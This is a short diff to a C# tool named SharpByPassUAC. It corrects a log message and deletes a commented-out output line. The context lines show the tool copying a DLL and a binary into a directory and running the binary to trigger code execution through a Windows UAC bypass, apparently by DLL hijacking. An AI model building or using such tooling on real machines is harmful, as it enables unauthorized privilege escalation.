@@ -67,7 +67,7 @@ namespace SharpByPassUAC
             File.Copy(opts.InputDLL, dllTarget, true);
 
             string binaryTarget = string.Format(@"{0}{1}", directory, Path.GetFileName(opts.InputBinary));
-            Console.WriteLine("[+] Copy the binary {0} to {1}.", opts.InputDLL.Pastel(Color.Gold), binaryTarget.Pastel(Color.Gold));
+            Console.WriteLine("[+] Copy the binary {0} to {1}.", opts.InputBinary.Pastel(Color.Gold), binaryTarget.Pastel(Color.Gold));
             File.Copy(opts.InputBinary, binaryTarget, true);
 
             Console.WriteLine("[+] Run the binary {0} to trigger the code execution with UAC ByPass.", binaryTarget.Pastel(Color.Gold));
@@ -80,8 +80,6 @@ namespace SharpByPassUAC
             process.StartInfo = startInfo;
             process.Start();
             string result = process.StandardOutput.ReadToEnd();
-            //Console.WriteLine("[+] Output :\n{0}", result.Pastel(Color.Gold));
-
 
             try
             {
